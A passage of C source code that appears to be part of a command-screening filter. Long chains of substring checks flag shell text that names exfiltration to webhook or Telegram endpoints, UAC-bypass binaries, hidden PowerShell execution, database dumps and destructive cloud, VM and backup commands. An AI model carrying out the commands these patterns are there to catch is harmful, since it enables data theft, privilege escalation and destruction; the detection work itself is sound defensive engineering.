                     ci_contains(text, "printuientry"))) ||
                   (ci_contains(text, "verifier") &&
                    (ci_contains(text, " /standard") ||
                     ci_contains(text, " /all") ||
                     ci_contains(text, " /volatile") ||
                     ci_contains(text, " /boot") ||
                     ci_contains(text, " /faults"))) ||
                   (ci_contains(text, "lpadmin") &&
                    (ci_contains(text, " -x") ||
                     ci_contains(text, " -p") ||
                     ci_contains(text, " -v") ||
                     ci_contains(text, " -e"))) ||
                   (ci_contains(text, "cancel") &&
                    ci_contains(text, " -a")) ||
                   (ci_contains(text, "lpmove") &&
                    ci_contains(text, " ")) ||
                   ci_contains(text, "cupsdisable") ||
                   ci_contains(text, "cupsreject") ||
                   (ci_contains(text, "update-initramfs") &&
                    (ci_contains(text, " -u") ||
                     ci_contains(text, " -c") ||
                     ci_contains(text, " -d"))) ||
                   (ci_contains(text, "mkinitrd") &&
                    (ci_contains(text, " -o") ||
                     ci_contains(text, " -f"))) ||
                   ci_contains(text, "update-grub") ||
                   (ci_contains(text, "grub2-mkconfig") ||
                    ci_contains(text, "grub-mkconfig")) ||
                   (ci_contains(text, "grub-install") &&
                    (ci_contains(text, " /") ||
                     ci_contains(text, " --"))) ||
                   (ci_contains(text, "ssh-keygen") &&
                    (ci_contains(text, " -s ") ||
                     ci_contains(text, " -z ") ||
                     ci_contains(text, " -i "))) ||
                   (ci_contains(text, "mutt") &&
                    (ci_contains(text, " -a") ||
                     ci_contains(text, " -s") ||
                     ci_contains(text, " @"))) ||
                   (ci_contains(text, "mailx") &&
                    (ci_contains(text, " -a") ||
                     ci_contains(text, " @"))) ||
                   (ci_contains(text, "sendmail") &&
                    (ci_contains(text, " <") ||
                     ci_contains(text, " -t") ||
                     ci_contains(text, " -f"))) ||
                   (ci_contains(text, "s-nail") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "mpack") &&
                    ci_contains(text, " ")) ||
                   ((ci_contains(text, "curl") ||
                     ci_contains(text, "wget") ||
                     ci_contains(text, "httpie") ||
                     ci_contains(text, "xh ")) &&
                    (ci_contains(text, " -d") ||
                     ci_contains(text, " -f") ||
                     ci_contains(text, " -t ") ||
                     ci_contains(text, "--data") ||
                     ci_contains(text, "--form") ||
                     ci_contains(text, "--upload") ||
                     ci_contains(text, "-post")) &&
                    (ci_contains(text, "api.telegram.org") ||
                     ci_contains(text, "/api/webhooks") ||
                     ci_contains(text, "hooks.slack.com") ||
                     ci_contains(text, "outlook.office.com/webhook") ||
                     ci_contains(text, "webhook.site") ||
                     ci_contains(text, "pipedream") ||
                     ci_contains(text, "requestbin") ||
                     ci_contains(text, "hookbin") ||
                     ci_contains(text, "beeceptor") ||
                     ci_contains(text, "smee.io"))) ||
                   (ci_contains(text, "systemd-cryptenroll") &&
                    ci_contains(text, " --")) ||
                   (ci_contains(text, "homectl") &&
                    (ci_contains(text, " create") ||
                     ci_contains(text, " remove") ||
                     ci_contains(text, " passwd") ||
                     ci_contains(text, " update") ||
                     ci_contains(text, " rename") ||
                     ci_contains(text, " deactivate"))) ||
                   (ci_contains(text, "bootctl") &&
                    (ci_contains(text, " install") ||
                     ci_contains(text, " remove") ||
                     ci_contains(text, " update") ||
                     ci_contains(text, " set-") ||
                     ci_contains(text, " write"))) ||
                   (ci_contains(text, "udevadm") &&
                    (ci_contains(text, " trigger") ||
                     ci_contains(text, " test") ||
                     ci_contains(text, " control") ||
                     ci_contains(text, " --"))) ||
                   (ci_contains(text, "clevis") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "fscrypt") &&
                    (ci_contains(text, " encrypt") ||
                     ci_contains(text, " purge") ||
                     ci_contains(text, " destroy") ||
                     ci_contains(text, " lock") ||
                     ci_contains(text, " unlock"))) ||
                   (ci_contains(text, "tomb") &&
                    (ci_contains(text, " -") ||
                     ci_contains(text, " dig"))) ||
                   (ci_contains(text, "gocryptfs") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "encfs") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "cryfs") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "veracrypt") &&
                    (ci_contains(text, " -") ||
                     ci_contains(text, " /"))) ||
                   ci_contains(text, "ecryptfs") ||
                   (ci_contains(text, "htpasswd") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " -b") ||
                     ci_contains(text, " -b") ||
                     ci_contains(text, " -d") ||
                     ci_contains(text, " -v"))) ||
                   (ci_contains(text, "amtool") &&
                    (ci_contains(text, " silence") ||
                     ci_contains(text, " alert") ||
                     ci_contains(text, " expire"))) ||
                   ci_contains(text, "mimirtool") ||
                   (ci_contains(text, "grafana-cli") &&
                    (ci_contains(text, " admin") ||
                     ci_contains(text, " plugins") ||
                     ci_contains(text, " --"))) ||
                   (ci_contains(text, "onevm") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "onehost") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "pvesh") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " set") ||
                     ci_contains(text, " create"))) ||
                   (ci_contains(text, "qm ") &&
                    (ci_contains(text, " destroy") ||
                     ci_contains(text, " del") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " shutdown") ||
                     ci_contains(text, " migrate") ||
                     ci_contains(text, " template") ||
                     ci_contains(text, " clone") ||
                     ci_contains(text, " set"))) ||
                   (ci_contains(text, "pct ") &&
                    (ci_contains(text, " destroy") ||
                     ci_contains(text, " del") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " shutdown") ||
                     ci_contains(text, " exec"))) ||
                   (ci_contains(text, "openstack") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " remove") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " shutoff") ||
                     ci_contains(text, " hard"))) ||
                   (ci_contains(text, "nova ") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " force"))) ||
                   (ci_contains(text, "doctl") &&
                    ci_contains(text, " delete")) ||
                   (ci_contains(text, "hcloud") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " poweroff") ||
                     ci_contains(text, " rebuild") ||
                     ci_contains(text, " shutdown"))) ||
                   (ci_contains(text, "scw") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " stop"))) ||
                   (ci_contains(text, "oci") &&
                    (ci_contains(text, " terminate") ||
                     ci_contains(text, " delete"))) ||
                   (ci_contains(text, "govc") &&
                    (ci_contains(text, "vm.destroy") ||
                     ci_contains(text, "vm.power") ||
                     ci_contains(text, "vm.delete") ||
                     ci_contains(text, "datastore") ||
                     ci_contains(text, "host."))) ||
                   (ci_contains(text, "vim-cmd") &&
                    (ci_contains(text, "power.") ||
                     ci_contains(text, "destroy") ||
                     ci_contains(text, "unreg"))) ||
                   (ci_contains(text, "esxcli") &&
                    (ci_contains(text, " kill") ||
                     ci_contains(text, " set") ||
                     ci_contains(text, " unload") ||
                     ci_contains(text, " network") ||
                     ci_contains(text, " firewall") ||
                     ci_contains(text, " storage") ||
                     ci_contains(text, " system"))) ||
                   (ci_contains(text, "virtctl") &&
                    (ci_contains(text, " stop") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " pause") ||
                     ci_contains(text, " migrate") ||
                     ci_contains(text, " start") ||
                     ci_contains(text, " console"))) ||
                   (ci_contains(text, "rancher") &&
                    (ci_contains(text, " app") ||
                     ci_contains(text, " login") ||
                     ci_contains(text, " cluster") ||
                     ci_contains(text, " server") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " context"))) ||
                   (ci_contains(text, "rke ") &&
                    (ci_contains(text, " remove") ||
                     ci_contains(text, " up") ||
                     ci_contains(text, " etcd"))) ||
                   (ci_contains(text, "k3d") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " create"))) ||
                   (ci_contains(text, "kind") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " create") ||
                     ci_contains(text, " load"))) ||
                   (ci_contains(text, "minikube") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " stop"))) ||
                   (ci_contains(text, "colima") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " start"))) ||
                   (ci_contains(text, "docker swarm") &&
                    (ci_contains(text, " leave") ||
                     ci_contains(text, " join") ||
                     ci_contains(text, " update") ||
                     ci_contains(text, " init"))) ||
                   (ci_contains(text, "ctr ") &&
                    (ci_contains(text, " exec") ||
                     ci_contains(text, " rm") ||
                     ci_contains(text, " kill"))) ||
                   (ci_contains(text, "umoci") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "skopeo") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "cosign") &&
                    (ci_contains(text, " sign") ||
                     ci_contains(text, " attest") ||
                     ci_contains(text, " upload"))) ||
                   (ci_contains(text, "helmfile") &&
                    (ci_contains(text, " apply") ||
                     ci_contains(text, " sync") ||
                     ci_contains(text, " destroy") ||
                     ci_contains(text, " delete"))) ||
                   (ci_contains(text, "argocd") &&
                    (ci_contains(text, " app delete") ||
                     ci_contains(text, " app sync") ||
                     ci_contains(text, " cluster") ||
                     ci_contains(text, " repo") ||
                     ci_contains(text, " app set"))) ||
                   (ci_contains(text, "flux") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " suspend") ||
                     ci_contains(text, " uninstall") ||
                     ci_contains(text, " reconcile"))) ||
                   (ci_contains(text, "certbot") &&
                    (ci_contains(text, " delete") ||
                     ci_contains(text, " revoke") ||
                     ci_contains(text, " unregister") ||
                     ci_contains(text, " --cert-name"))) ||
                   (ci_contains(text, "kubeseal") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "sops") &&
                    (ci_contains(text, " -d") ||
                     ci_contains(text, "--decrypt") ||
                     ci_contains(text, " updatekeys") ||
                     ci_contains(text, " rotate"))) ||
                   (ci_contains(text, "spark-submit") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "flink") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " cancel") ||
                     ci_contains(text, " stop") ||
                     ci_contains(text, " savepoint"))) ||
                   (ci_contains(text, "oozie") &&
                    (ci_contains(text, " job") ||
                     ci_contains(text, " -oozie") ||
                     ci_contains(text, " -dryrun") ||
                     ci_contains(text, " sla") ||
                     ci_contains(text, " bundle") ||
                     ci_contains(text, " validate") ||
                     ci_contains(text, " submit"))) ||
                   (ci_contains(text, "airflow") &&
                    (ci_contains(text, " dags") ||
                     ci_contains(text, " db") ||
                     ci_contains(text, " scheduler") ||
                     ci_contains(text, " webserver") ||
                     ci_contains(text, " celery") ||
                     ci_contains(text, " users") ||
                     ci_contains(text, " connections") ||
                     ci_contains(text, " variables") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " reset"))) ||
                   ci_contains(text, "sqoop") ||
                   ci_contains(text, "distcp") ||
                   (ci_contains(text, "huggingface-cli") &&
                    (ci_contains(text, " upload") ||
                     ci_contains(text, " delete"))) ||
                   ci_contains(text, "driftnet") ||
                   ci_contains(text, "xplico") ||
                   ci_contains(text, "text2pcap") ||
                   ci_contains(text, "mergecap") ||
                   ci_contains(text, "editcap") ||
                   ci_contains(text, "trafgen") ||
                   ci_contains(text, "mausezahn") ||
                   ci_contains(text, "mz -") ||
                   ci_contains(text, "nemesis") ||
                   ci_contains(text, "parprouted") ||
                   ci_contains(text, "zarp") ||
                   (ci_contains(text, "lftp") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " mirror"))) ||
                   (ci_contains(text, "ncftpput") ||
                    ci_contains(text, "ncftpget")) ||
                   ci_contains(text, "autorunsc") ||
                   ci_contains(text, "handle64") ||
                   ci_contains(text, "logonsessions") ||

                   ci_contains(text, "chromium --remote-debugging") ||
                   ci_contains(text, "chrome --remote-debugging") ||
                   ci_contains(text, "firefox --remote-debugging") ||
                   ci_contains(text, "msedge --remote-debugging") ||
                   ci_contains(text, "brave --remote-debugging") ||
                   ci_contains(text, "--remote-debugging-port") ||
                   ci_contains(text, "--remote-debugging-pipe")) {
            what = "mobile/re/osint/infra-ctl/destructive primitive";
        /* c244: k8s/mesh/registry/IaC helpers + secret CLIs + UAC/
         * LOLBin extras + backup destruct + exec-context/interp
         * primitives + dialog spoof + VPN/proxy/NAT ── */
        } else if (ci_contains(text, "kubectx") ||
                   ci_contains(text, "kubens") ||
                   (ci_contains(text, "k9s") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "stern") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "kail") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "kubecm") ||
                   ci_contains(text, "krew ") ||
                   ci_contains(text, "telepresence") ||
                   ci_contains(text, "mirrord") ||
                   (ci_contains(text, "kapp") &&
                    (ci_contains(text, " deploy") ||
                     ci_contains(text, " delete"))) ||
                   (ci_contains(text, "kbld") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "ytt") &&
                    (ci_contains(text, " -f") ||
                     ci_contains(text, " --"))) ||
                   ci_contains(text, "vendir") ||
                   (ci_contains(text, "skaffold") &&
                    (ci_contains(text, " deploy") ||
                     ci_contains(text, " run") ||
                     ci_contains(text, " delete"))) ||
                   (ci_contains(text, "tilt") &&
                    (ci_contains(text, " up") ||
                     ci_contains(text, " down") ||
                     ci_contains(text, " ci"))) ||
                   (ci_contains(text, "garden") &&
                    (ci_contains(text, " deploy") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " plugins"))) ||
                   (ci_contains(text, "draft") &&
                    (ci_contains(text, " up") ||
                     ci_contains(text, " create") ||
                     ci_contains(text, " -"))) ||
                   ci_contains(text, "istioctl") ||
                   ci_contains(text, "linkerd ") ||
                   (ci_contains(text, "consul") &&
                    (ci_contains(text, " connect") ||
                     ci_contains(text, " kv") ||
                     ci_contains(text, " acl") ||
                     ci_contains(text, " reload") ||
                     ci_contains(text, " leave"))) ||
                   ci_contains(text, "cilium") ||
                   ci_contains(text, "calicoctl") ||
                   ci_contains(text, "crane ") ||
                   ci_contains(text, "regctl") ||
                   (ci_contains(text, "notation") &&
                    (ci_contains(text, " sign") ||
                     ci_contains(text, " -"))) ||
                   ci_contains(text, "docker-credential-") ||
                   (ci_contains(text, "terragrunt") &&
                    (ci_contains(text, " destroy") ||
                     ci_contains(text, " apply") ||
                     ci_contains(text, " run-all"))) ||
                   (ci_contains(text, "atlantis") &&
                    (ci_contains(text, " plan") ||
                     ci_contains(text, " apply") ||
                     ci_contains(text, " unlock"))) ||
                   (ci_contains(text, "terramate") &&
                    ci_contains(text, " ")) ||
                   ci_contains(text, "crossplane") ||
                   (ci_contains(text, "checkov") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "tfsec") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "terrascan") &&
                    ci_contains(text, " ")) ||
                   ci_contains(text, "kics ") ||
                   (ci_contains(text, "conftest") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "opa") &&
                    (ci_contains(text, " eval") ||
                     ci_contains(text, " exec") ||
                     ci_contains(text, " run"))) ||
                   (ci_contains(text, "trivy") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "grype") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "syft") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "op ") &&
                    (ci_contains(text, "get") ||
                     ci_contains(text, "inject") ||
                     ci_contains(text, "signin") ||
                     ci_contains(text, "read") ||
                     ci_contains(text, "document") ||
                     ci_contains(text, "item") ||
                     ci_contains(text, "vault"))) ||
                   (ci_contains(text, "doppler") &&
                    (ci_contains(text, " secrets") ||
                     ci_contains(text, " run"))) ||
                   (ci_contains(text, "infisical") &&
                    ci_contains(text, " ")) ||
                   ci_contains(text, "pslist") ||
                   ci_contains(text, "pskill") ||
                   ci_contains(text, "psinfo") ||
                   ci_contains(text, "accesschk") ||
                   ci_contains(text, "autoruns") ||
                   ci_contains(text, "pipelist") ||
                   (ci_contains(text, "sigcheck") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "streams -d") ||
                   ci_contains(text, "sdelete") ||
                   ci_contains(text, "fodhelper") ||
                   ci_contains(text, "computerdefaults") ||
                   ci_contains(text, "sdclt") ||
                   ci_contains(text, "slui") ||
                   ci_contains(text, "eventvwr") ||
                   ci_contains(text, "wsreset") ||
                   ci_contains(text, "wt.exe") ||
                   ci_contains(text, "te.exe") ||
                   (ci_contains(text, "tracker") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "vsiisexelauncher") ||
                   ci_contains(text, "wmpsetup") ||
                   ci_contains(text, "workfolders") ||
                   ci_contains(text, "cmlutil") ||
                   (ci_contains(text, "slmgr") &&
                    (ci_contains(text, "/") ||
                     ci_contains(text, " -"))) ||
                   ci_contains(text, "rasautou") ||
                   ci_contains(text, "rdpsign") ||
                   (ci_contains(text, "sftp") &&
                    ci_contains(text, " -b")) ||
                   (ci_contains(text, "restic") &&
                    (ci_contains(text, " forget") ||
                     ci_contains(text, " backup") ||
                     ci_contains(text, " check") ||
                     ci_contains(text, " prune"))) ||
                   (ci_contains(text, "borg") &&
                    (ci_contains(text, " prune") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " create"))) ||
                   (ci_contains(text, "rsync") &&
                    ci_contains(text, "--delete")) ||
                   ci_contains(text, "rdiff-backup") ||
                   (ci_contains(text, "duplicity") &&
                    (ci_contains(text, " remove") ||
                     ci_contains(text, " cleanup") ||
                     ci_contains(text, " full"))) ||
                   (ci_contains(text, "kopia") &&
                    (ci_contains(text, " snapshot delete") ||
                     ci_contains(text, " delete") ||
                     ci_contains(text, " maintenance"))) ||
                   ci_contains(text, "bconsole") ||
                   ci_contains(text, "setsid ") ||
                   (ci_contains(text, "nohup") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "disown") &&
                    (ci_contains(text, " -") ||
                     ci_contains(text, " %"))) ||
                   ci_contains(text, "daemonize ") ||
                   (ci_contains(text, "start-stop-daemon") &&
                    ci_contains(text, " -b")) ||
                   (ci_contains(text, "sg ") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "newgrp") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "getcap") &&
                    (ci_contains(text, " /") ||
                     ci_contains(text, " -"))) ||
                   ci_contains(text, "ktutil") ||
                   ci_contains(text, "kadmin") ||
                   ci_contains(text, "msktutil") ||
                   (ci_contains(text, "systemd-run") &&
                    (ci_contains(text, "--pty") ||
                     ci_contains(text, "--uid") ||
                     ci_contains(text, "--collect") ||
                     ci_contains(text, "--property") ||
                     ci_contains(text, "--on-") ||
                     ci_contains(text, "--unit") ||
                     ci_contains(text, "--description") ||
                     ci_contains(text, "--timer") ||
                     ci_contains(text, "--path") ||
                     ci_contains(text, "--socket") ||
                     ci_contains(text, "--mount") ||
                     ci_contains(text, "--nice") ||
                     ci_contains(text, "--setenv") ||
                     ci_contains(text, "--working-directory"))) ||
                   ci_contains(text, "systemd-cat") ||
                   (ci_contains(text, "systemd-tmpfiles") &&
                    (ci_contains(text, " --create") ||
                     ci_contains(text, " --remove") ||
                     ci_contains(text, " --clean"))) ||
                   ci_contains(text, "systemd-inhibit") ||
                   (ci_contains(text, "busctl") &&
                    (ci_contains(text, " set-property") ||
                     ci_contains(text, " call") ||
                     ci_contains(text, " get-property"))) ||
                   (ci_contains(text, "logger") &&
                    (ci_contains(text, " -n") ||
                     ci_contains(text, " -r") ||
                     ci_contains(text, "--server") ||
                     ci_contains(text, " -t"))) ||
                   (ci_contains(text, "hwclock") &&
                    (ci_contains(text, "--systohc") ||
                     ci_contains(text, "--hctosys") ||
                     ci_contains(text, "--set") ||
                     ci_contains(text, "--adjust") ||
                     ci_contains(text, "--epoch="))) ||
                   ci_contains(text, "ntpdate") ||
                   (ci_contains(text, "chronyc") &&
                    (ci_contains(text, " offline") ||
                     ci_contains(text, " online") ||
                     ci_contains(text, " settime") ||
                     ci_contains(text, " makestep") ||
                     ci_contains(text, " sources"))) ||
                   (ci_contains(text, "tmux") &&
                    (ci_contains(text, " new-session -d") ||
                     ci_contains(text, " new -d") ||
                     ci_contains(text, " load-buffer") ||
                     ci_contains(text, " source-file"))) ||
                   (ci_contains(text, "screen") &&
                    (ci_contains(text, " -dm") ||
                     ci_contains(text, " -dms") ||
                     ci_contains(text, " -d -m"))) ||
                   (ci_contains(text, "inotifywait") &&
                    (ci_contains(text, " -m") ||
                     ci_contains(text, " -r") ||
                     ci_contains(text, " -e"))) ||
                   (ci_contains(text, "watch") &&
                    (ci_contains(text, " -n") ||
                     ci_contains(text, " -x"))) ||
                   ci_contains(text, "zenity") ||
                   ci_contains(text, "kdialog") ||
                   ci_contains(text, "whiptail") ||
                   (ci_contains(text, "newt") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "osascript") &&
                    (ci_contains(text, "display dialog") ||
                     ci_contains(text, "display alert"))) ||
                   (ci_contains(text, "notify-send") &&
                    (ci_contains(text, " -u") ||
                     ci_contains(text, " -i") ||
                     ci_contains(text, " --"))) ||
                   ci_contains(text, "dnctl ") ||
                   ci_contains(text, "natd") ||
                   ci_contains(text, "portfwd") ||
                   (ci_contains(text, "redir") &&
                    (ci_contains(text, "--lport") ||
                     ci_contains(text, "--cport") ||
                     ci_contains(text, "--laddr") ||
                     ci_contains(text, "--caddr") ||
                     ci_contains(text, "--bport") ||
                     ci_contains(text, "--bind"))) ||
                   (ci_contains(text, "nginx") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " -g"))) ||
                   (ci_contains(text, "haproxy") &&
                    (ci_contains(text, " -f") ||
                     ci_contains(text, " -db"))) ||
                   (ci_contains(text, "caddy") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " reload"))) ||
                   (ci_contains(text, "tinyproxy") &&
                    ci_contains(text, " -")) ||
                   (ci_contains(text, "squid") &&
                    (ci_contains(text, " -f") ||
                     ci_contains(text, " -z") ||
                     ci_contains(text, " -k"))) ||
                   (ci_contains(text, "polipo") &&
                    ci_contains(text, " -")) ||
                   ci_contains(text, "microsocks") ||
                   ci_contains(text, "3proxy") ||
                   (ci_contains(text, "openvpn") &&
                    (ci_contains(text, " --config") ||
                     ci_contains(text, " --daemon") ||
                     ci_contains(text, " --up") ||
                     ci_contains(text, " --down") ||
                     ci_contains(text, "--script-security") ||
                     ci_contains(text, "--mktun") ||
                     ci_contains(text, "--rmtun") ||
                     ci_contains(text, "--remote") ||
                     ci_contains(text, "--dev "))) ||
                   ci_contains(text, "wireguard") ||
                   ci_contains(text, "wg-quick") ||
                   ci_contains(text, "xl2tpd") ||
                   ci_contains(text, "pptpd") ||
                   ci_contains(text, "openconnect") ||
                   ci_contains(text, "mkfifo /") ||
                   ci_contains(text, "tclsh") ||
                   (ci_contains(text, "julia") &&
                    ci_contains(text, " -e")) ||
                   (ci_contains(text, "r -e") ||
                    ci_contains(text, "rscript -e")) ||
                   (ci_contains(text, "octave") &&
                    ci_contains(text, " --eval")) ||
                   (ci_contains(text, "maxima") &&
                    ci_contains(text, " --batch")) ||
                   (ci_contains(text, "ghci") &&
                    ci_contains(text, " -e")) ||
                   ci_contains(text, "runhaskell") ||
                   (ci_contains(text, "fish") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "zsh") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "ksh") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "dash") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "csh") &&
                    ci_contains(text, " -c")) ||
                   (ci_contains(text, "powershell") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " -ec") ||
                     ci_contains(text, " -ep bypass") ||
                     ci_contains(text, " -ep unrestricted") ||
                     ci_contains(text, " -executionpolicy bypass") ||
                     ci_contains(text, " -executionpolicy unrestricted") ||
                     ci_contains(text, " -sta") ||
                     ci_contains(text, " -mta") ||
                     ci_contains(text, " -w hidden") ||
                     ci_contains(text, " -windowstyle hidden"))) ||
                   (ci_contains(text, "pwsh") &&
                    (ci_contains(text, " -c") ||
                     ci_contains(text, " -ep bypass") ||
                     ci_contains(text, " -ep unrestricted") ||
                     ci_contains(text, " -executionpolicy bypass") ||
                     ci_contains(text, " -executionpolicy unrestricted") ||
                     ci_contains(text, " -sta") ||
                     ci_contains(text, " -w hidden") ||
                     ci_contains(text, " -windowstyle hidden"))) ||
                   (ci_contains(text, "deno") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " eval") ||
                     ci_contains(text, " task"))) ||
                   (ci_contains(text, "bun ") &&
                    (ci_contains(text, " run") ||
                     ci_contains(text, " x ") ||
                     ci_contains(text, " -e"))) ||
                   ci_contains(text, "bunx") ||
                   (ci_contains(text, "npx") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "pnpm") &&
                    (ci_contains(text, " dlx") ||
                     ci_contains(text, " exec"))) ||
                   (ci_contains(text, "yarn") &&
                    (ci_contains(text, " dlx") ||
                     ci_contains(text, " exec"))) ||
                   (ci_contains(text, "pipx") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "go ") &&
                    (ci_contains(text, " install") ||
                     ci_contains(text, " run"))) ||
                   (ci_contains(text, "composer") &&
                    (ci_contains(text, " require") ||
                     ci_contains(text, " global") ||
                     ci_contains(text, " exec") ||
                     ci_contains(text, " create-project") ||
                     ci_contains(text, " install"))) ||
                   (ci_contains(text, "nimble") &&
                    (ci_contains(text, " install") ||
                     ci_contains(text, " build") ||
                     ci_contains(text, " run") ||
                     ci_contains(text, " init") ||
                     ci_contains(text, " doc") ||
                     ci_contains(text, " refresh"))) ||
                   (ci_contains(text, "opam") &&
                    (ci_contains(text, " install") ||
                     ci_contains(text, " exec"))) ||
                   (ci_contains(text, "luarocks") &&
                    ci_contains(text, " ")) ||
                   (ci_contains(text, "julia") &&
                    ci_contains(text, " -e")) ||
                   (ci_contains(text, "at ") &&
                    (ci_contains(text, "now") ||
                     ci_contains(text, " -f"))) ||
                   (ci_contains(text, "batch") &&
                    (ci_contains(text, " <") ||
                     ci_contains(text, " -f"))) ||
                   ci_contains(text, "env -i") ||
                   (ci_contains(text, "env ") &&
                    (ci_contains(text, " -i") ||
                     (ci_contains(text, "=") &&
                      (ci_contains(text, " sh") ||
                       ci_contains(text, "bash") ||
                       ci_contains(text, "zsh") ||
                       ci_contains(text, "dash") ||
                       ci_contains(text, "ksh") ||
                       ci_contains(text, "csh") ||
                       ci_contains(text, "fish") ||
                       ci_contains(text, " cmd") ||
                       ci_contains(text, "powershell") ||
                       ci_contains(text, "pwsh") ||
                       ci_contains(text, "python") ||
                       ci_contains(text, "perl") ||
                       ci_contains(text, "ruby") ||
                       ci_contains(text, "node") ||
                       ci_contains(text, "php") ||
                       ci_contains(text, "curl") ||
                       ci_contains(text, "wget") ||
                       ci_contains(text, "nc ") ||
                       ci_contains(text, "socat") ||
                       ci_contains(text, " awk") ||
                       ci_contains(text, "base64")))))) {
            what = "k8s/mesh/registry/iac/sec-cli/uac/exec primitive";
        }
        /* ── cycle-245: db exfil/backup + rmm/remote access + modern
           proxy/tunnel transports + BYOVD/packers + cloud-attack +
           spray/phish kits + miners + bcc/forensics + wifi/bt/nfc/can/
           scada + remaining win/unix mgmt primitives ── */
        else if (
            /* db dump / exfil primitives */
            ci_contains(text, "pg_dump") ||
            ci_contains(text, "mysqldump") ||
            ci_contains(text, "mariadb-dump") ||
            ci_contains(text, "mariadb-backup") ||
            ci_contains(text, "mariabackup") ||
            ci_contains(text, "mongodump") ||
            ci_contains(text, "mongoexport") ||
            ci_contains(text, "elasticdump") ||
            (ci_contains(text, "sqlite3") &&
             ci_contains(text, ".dump")) ||
            (ci_contains(text, "redis-cli") &&
             ci_contains(text, "--rdb")) ||
            (ci_contains(text, "bcp") &&
             ci_contains(text, " out")) ||
            ci_contains(text, "expdp") ||
            ci_contains(text, "sqlldr") ||
            ci_contains(text, "wal-g") ||
            ci_contains(text, "pgbackrest") ||
            ci_contains(text, "xtrabackup") ||
            (ci_contains(text, "nodetool") &&
             (ci_contains(text, " drain") ||
              ci_contains(text, " cleanup") ||
              ci_contains(text, " decommission") ||
              ci_contains(text, " snapshot") ||
              ci_contains(text, " clearsnapshot") ||
              ci_contains(text, " disablebinary") ||
              ci_contains(text, " stopdaemon"))) ||
            (ci_contains(text, "gluster") &&
             (ci_contains(text, " delete") ||
              ci_contains(text, " stop") ||
              ci_contains(text, " rebalance"))) ||
            (ci_contains(text, "rbd") &&
             (ci_contains(text, " rm") ||
              ci_contains(text, " remove") ||
              ci_contains(text, " snap") ||
              ci_contains(text, " map") ||
              ci_contains(text, " bench-write"))) ||
            /* mail pull-down / sync = mailbox theft */
            (ci_contains(text, "fetchmail") &&
             (ci_contains(text, " -k") ||
              ci_contains(text, " -a") ||
              ci_contains(text, " -d") ||
              ci_contains(text, " -f"))) ||
            ci_contains(text, "offlineimap") ||
            ci_contains(text, "mbsync") ||
            /* object stores / ipfs publish */
            (ci_contains(text, "ipfs") &&
             (ci_contains(text, " add") ||
              ci_contains(text, " pin") ||
              ci_contains(text, " get") ||
              ci_contains(text, " swarm") ||
              ci_contains(text, " daemon") ||
              ci_contains(text, " block") ||
              ci_contains(text, " name"))) ||
            (ci_contains(text, "s3cmd") &&
             (ci_contains(text, " put") ||
              ci_contains(text, " get") ||
              ci_contains(text, " sync") ||
              ci_contains(text, " del") ||
              ci_contains(text, " rm") ||
              ci_contains(text, " mb") ||
              ci_contains(text, " rb"))) ||
            (ci_contains(text, "mc ") &&
             (ci_contains(text, " cp") ||
              ci_contains(text, " mv") ||
              ci_contains(text, " rm") ||
              ci_contains(text, " mirror") ||
              ci_contains(text, " share") ||
              ci_contains(text, " admin"))) ||
